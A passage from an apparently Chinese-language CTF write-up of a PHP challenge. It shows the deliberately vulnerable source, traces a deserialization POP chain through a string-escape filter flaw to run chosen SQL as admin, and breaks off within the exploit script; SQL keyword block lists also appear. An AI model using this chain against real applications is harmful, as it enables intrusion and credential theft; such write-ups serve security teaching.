</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"keyword\">$this</span>-&gt;sql;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">dbCtrl</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $hostname=<span class=\"string\">\"127.0.0.1\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $dbuser=<span class=\"string\">\"noob123\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $dbpass=<span class=\"string\">\"noob123\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $database=<span class=\"string\">\"noob123\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $name;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $password;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $mysqli;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $token;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;name=$_POST[<span class=\"string\">'username'</span>];</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;password=$_POST[<span class=\"string\">'password'</span>];</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;token=$_SESSION[<span class=\"string\">'token'</span>];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">login</span><span class=\"params\">($sql)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;mysqli=<span class=\"keyword\">new</span> mysqli(<span class=\"keyword\">$this</span>-&gt;hostname, <span class=\"keyword\">$this</span>-&gt;dbuser, <span class=\"keyword\">$this</span>-&gt;dbpass, <span class=\"keyword\">$this</span>-&gt;database);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"keyword\">$this</span>-&gt;mysqli-&gt;connect_error) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">\"连接失败，错误:\"</span> . <span class=\"keyword\">$this</span>-&gt;mysqli-&gt;connect_error);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        $result=<span class=\"keyword\">$this</span>-&gt;mysqli-&gt;prepare($sql);</span><br><span class=\"line\">        $result-&gt;bind_param(<span class=\"string\">'s'</span>, <span class=\"keyword\">$this</span>-&gt;name);</span><br><span class=\"line\">        $result-&gt;execute();</span><br><span class=\"line\">        $result-&gt;bind_result($idResult, $passwordResult);</span><br><span class=\"line\">        $result-&gt;fetch();</span><br><span class=\"line\">        $result-&gt;close();</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"keyword\">$this</span>-&gt;token==<span class=\"string\">'admin'</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> $idResult;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!$idResult) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span>(<span class=\"string\">'用户不存在!'</span>);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (md5(<span class=\"keyword\">$this</span>-&gt;password)!==$passwordResult) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span>(<span class=\"string\">'密码错误！'</span>);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        $_SESSION[<span class=\"string\">'token'</span>]=<span class=\"keyword\">$this</span>-&gt;name;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> $idResult;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">update</span><span class=\"params\">($sql)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">//还没来得及写</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//login.php</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">require_once</span>(<span class=\"string\">'lib.php'</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\">&lt;meta http-equiv=<span class=\"string\">\"Content-Type\"</span> content=<span class=\"string\">\"text/html; charset=utf-8\"</span> /&gt; </span><br><span class=\"line\">&lt;title&gt;login&lt;/title&gt;</span><br><span class=\"line\">&lt;center&gt;</span><br><span class=\"line\">\t&lt;form action=<span class=\"string\">\"login.php\"</span> method=<span class=\"string\">\"post\"</span> style=<span class=\"string\">\"margin-top: 300\"</span>&gt;</span><br><span class=\"line\">\t\t&lt;h2&gt;百万前端的用户信息管理系统&lt;/h2&gt;</span><br><span class=\"line\">\t\t&lt;h3&gt;半成品系统 留后门的程序员已经跑路&lt;/h3&gt;</span><br><span class=\"line\">        \t\t&lt;input type=<span class=\"string\">\"text\"</span> name=<span class=\"string\">\"username\"</span> placeholder=<span class=\"string\">\"UserName\"</span> required&gt;</span><br><span class=\"line\">\t\t&lt;br&gt;</span><br><span class=\"line\">\t\t&lt;input type=<span class=\"string\">\"password\"</span> style=<span class=\"string\">\"margin-top: 20\"</span> name=<span class=\"string\">\"password\"</span> placeholder=<span class=\"string\">\"password\"</span> required&gt;</span><br><span class=\"line\">\t\t&lt;br&gt;</span><br><span class=\"line\">\t\t&lt;button style=<span class=\"string\">\"margin-top:20;\"</span> type=<span class=\"string\">\"submit\"</span>&gt;登录&lt;/button&gt;</span><br><span class=\"line\">\t\t&lt;br&gt;</span><br><span class=\"line\">\t\t&lt;img src=<span class=\"string\">'img/1.jpg'</span>&gt;大家记得做好防护&lt;/img&gt;</span><br><span class=\"line\">\t\t&lt;br&gt;</span><br><span class=\"line\">\t\t&lt;br&gt;</span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\">$user=<span class=\"keyword\">new</span> user();</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($_POST[<span class=\"string\">'username'</span>]))&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(preg_match(<span class=\"string\">\"/union|select|drop|delete|insert|\\#|\\%|\\`|\\@|\\\\\\\\/i\"</span>, $_POST[<span class=\"string\">'username'</span>]))&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">die</span>(<span class=\"string\">\"&lt;br&gt;Damn you, hacker!\"</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(preg_match(<span class=\"string\">\"/union|select|drop|delete|insert|\\#|\\%|\\`|\\@|\\\\\\\\/i\"</span>, $_POST[<span class=\"string\">'password'</span>]))&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">die</span>(<span class=\"string\">\"Damn you, hacker!\"</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t$user-&gt;login();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\">\t&lt;/form&gt;</span><br><span class=\"line\">&lt;/center&gt;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//update.php</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">require_once</span>(<span class=\"string\">'lib.php'</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">'&lt;html&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;meta charset=\"utf-8\"&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;title&gt;update&lt;/title&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;h2&gt;这是一个未完成的页面，上线时建议删除本页面&lt;/h2&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;/html&gt;'</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> ($_SESSION[<span class=\"string\">'login'</span>]!=<span class=\"number\">1</span>)&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">echo</span> <span class=\"string\">\"你还没有登陆呢！\"</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$users=<span class=\"keyword\">new</span> User();</span><br><span class=\"line\">$users-&gt;update();</span><br><span class=\"line\"><span class=\"keyword\">if</span>($_SESSION[<span class=\"string\">'login'</span>]===<span class=\"number\">1</span>)&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">require_once</span>(<span class=\"string\">\"flag.php\"</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">echo</span> $flag;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>大意就是获取admin的密码登入就可以拿到flag。主要审计是lib.php</p>\n<p>当时审的时候没有注意到<code>__toString</code>这个魔法方法，快结束的时候才注意到。主要还是太菜了</p>\n<p>____toString:在 PHP 5.2.0 之前，__toString() 方法只有在直接使用于 <a href=\"http://php.net/manual/zh/function.echo.php\" target=\"_blank\" rel=\"noopener\">echo</a> 或 <a href=\"http://php.net/manual/zh/function.print.php\" target=\"_blank\" rel=\"noopener\">print</a> 时才能生效。PHP 5.2.0 之后，则可以在任何字符串环境生效（例如通过 <a href=\"http://php.net/manual/zh/function.printf.php\" target=\"_blank\" rel=\"noopener\">printf()</a>，使用 <em>%s</em> 修饰符），但不能用于非字符串环境（如使用 <em>%d</em> 修饰符）。自 PHP 5.2.0 起，如果将一个未定义 __toString() 方法的对象转换为字符串，会产生 <code>E_RECOVERABLE_ERROR</code> 级别的错误。</p>\n<p>index.php是注入不了的。只能在update.php想办法</p>\n<p>user.php中</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$users=<span class=\"keyword\">new</span> User();</span><br><span class=\"line\">$users-&gt;update();</span><br></pre></td></tr></table></figure>\n\n<p>去查看user类的update方法</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">update</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        $Info=unserialize(<span class=\"keyword\">$this</span>-&gt;getNewinfo());</span><br><span class=\"line\">        $age=$Info-&gt;age;</span><br><span class=\"line\">        $nickname=$Info-&gt;nickname;</span><br><span class=\"line\">        $updateAction=<span class=\"keyword\">new</span> UpdateHelper($_SESSION[<span class=\"string\">'id'</span>], $Info, <span class=\"string\">\"update user SET age=$age,nickname=$nickname where id=\"</span>.$_SESSION[<span class=\"string\">'id'</span>]);</span><br><span class=\"line\">        <span class=\"comment\">//这个功能还没有写完 先占坑</span></span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>这里有unserialize函数，且$this-&gt;getNewinfo()可控，存在序列化漏洞</p>\n<p>跳转到getNewinfo方法</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getNewInfo</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        $age=$_POST[<span class=\"string\">'age'</span>];</span><br><span class=\"line\">        $nickname=$_POST[<span class=\"string\">'nickname'</span>];</span><br><span class=\"line\">        <span class=\"keyword\">return</span> safe(serialize(<span class=\"keyword\">new</span> Info($age,$nickname)));</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>再跳转到Info类</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Info</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $age;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $nickname;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $CtrlCase;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">($age,$nickname)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;age=$age;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;nickname=$nickname;</span><br><span class=\"line\">    &#125;   </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__call</span><span class=\"params\">($name,$argument)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"keyword\">$this</span>-&gt;CtrlCase-&gt;login($argument[<span class=\"number\">0</span>]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这里如果$this-&gt;CtrlCase是dbCtrl类的实例魔法方法__call可以调用到dbCtrl::logon（）</p>\n<p>且在User::getNewInfo方法中调用了一个safe过滤函数</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">safe</span><span class=\"params\">($parm)</span></span>&#123;</span><br><span class=\"line\">    $array= <span class=\"keyword\">array</span>(<span class=\"string\">'union'</span>,<span class=\"string\">'regexp'</span>,<span class=\"string\">'load'</span>,<span class=\"string\">'into'</span>,<span class=\"string\">'flag'</span>,<span class=\"string\">'file'</span>,<span class=\"string\">'insert'</span>,<span class=\"string\">\"'\"</span>,<span class=\"string\">'\\\\'</span>,<span class=\"string\">\"*\"</span>,<span class=\"string\">\"alter\"</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> str_replace($array,<span class=\"string\">'hacker'</span>,$parm);</span><br></pre></td></tr></table></figure>\n\n<p>存在序列化字符串逃逸漏洞</p>\n<p>执行完后，回到User::update方法</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">update</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        $Info=unserialize(<span class=\"keyword\">$this</span>-&gt;getNewinfo());</span><br><span class=\"line\">        $age=$Info-&gt;age;</span><br><span class=\"line\">        $nickname=$Info-&gt;nickname;</span><br><span class=\"line\">        $updateAction=<span class=\"keyword\">new</span> UpdateHelper($_SESSION[<span class=\"string\">'id'</span>], $Info, <span class=\"string\">\"update user SET age=$age,nickname=$nickname where id=\"</span>.$_SESSION[<span class=\"string\">'id'</span>]);</span><br><span class=\"line\">        <span class=\"comment\">//这个功能还没有写完 先占坑</span></span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>跳转到UpdateHelper类</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">Class</span> <span class=\"title\">UpdateHelper</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $id;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $newinfo;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $sql;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">($newInfo,$sql)</span></span>&#123;</span><br><span class=\"line\">        $newInfo=unserialize($newInfo);</span><br><span class=\"line\">        $upDate=<span class=\"keyword\">new</span> dbCtrl();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"keyword\">$this</span>-&gt;sql;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>如果$this-&gt;sql是一个类对象会触发User::__toString方法</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__toString</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">$this</span>-&gt;nickname-&gt;update(<span class=\"keyword\">$this</span>-&gt;age);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">\"0-0\"</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>有update方法的只有dbCtrl类，但是Info类中有一个魔法调用</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__call</span><span class=\"params\">($name,$argument)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"keyword\">$this</span>-&gt;CtrlCase-&gt;login($argument[<span class=\"number\">0</span>]);</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>如果让User类中的$this-&gt;nickname为dbCtrl类的实例就调用到dbCtrl::login方法，而且$sql可控</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">login</span><span class=\"params\">($sql)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;mysqli=<span class=\"keyword\">new</span> mysqli(<span class=\"keyword\">$this</span>-&gt;hostname, <span class=\"keyword\">$this</span>-&gt;dbuser, <span class=\"keyword\">$this</span>-&gt;dbpass, <span class=\"keyword\">$this</span>-&gt;database);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"keyword\">$this</span>-&gt;mysqli-&gt;connect_error) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">\"连接失败，错误:\"</span> . <span class=\"keyword\">$this</span>-&gt;mysqli-&gt;connect_error);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        $result=<span class=\"keyword\">$this</span>-&gt;mysqli-&gt;prepare($sql);</span><br><span class=\"line\">        $result-&gt;bind_param(<span class=\"string\">'s'</span>, <span class=\"keyword\">$this</span>-&gt;name);</span><br><span class=\"line\">        $result-&gt;execute();</span><br><span class=\"line\">        $result-&gt;bind_result($idResult, $passwordResult);</span><br><span class=\"line\">        $result-&gt;fetch();</span><br><span class=\"line\">        $result-&gt;close();</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"keyword\">$this</span>-&gt;token==<span class=\"string\">'admin'</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> $idResult;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!$idResult) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span>(<span class=\"string\">'用户不存在!'</span>);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (md5(<span class=\"keyword\">$this</span>-&gt;password)!==$passwordResult) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span>(<span class=\"string\">'密码错误！'</span>);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        $_SESSION[<span class=\"string\">'token'</span>]=<span class=\"keyword\">$this</span>-&gt;name;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> $idResult;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>附上脚本</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Info</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $age;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $nickname;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $CtrlCase;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">User</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $id;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $age;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $nickname;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;age=<span class=\"string\">'select password,id from user where username=?'</span>;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;nickname=<span class=\"keyword\">new</span> Info();</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;nickname-&gt;CtrlCase=<span class=\"keyword\">new</span> dbCtrl();</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;nickname-&gt;nickname=<span class=\"string\">''</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">dbCtrl</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $hostname=<span class=\"string\">\"127.0.0.1\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $dbuser=<span class=\"string\">\"root\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $dbpass=<span class=\"string\">\"root\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $database=<span class=\"string\">\"test\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $name=<span class=\"string\">'admin'</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $password=<span class=\"string\">'1'</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $mysqli;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $token=<span class=\"string\">'admin'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">Class</span> <span class=\"title\">UpdateHelper</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $id;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $newinfo;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $sql;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;sql=<span class=\"keyword\">new</span> User();</span><br><span class=\"line\">    &#125;</span><br><span 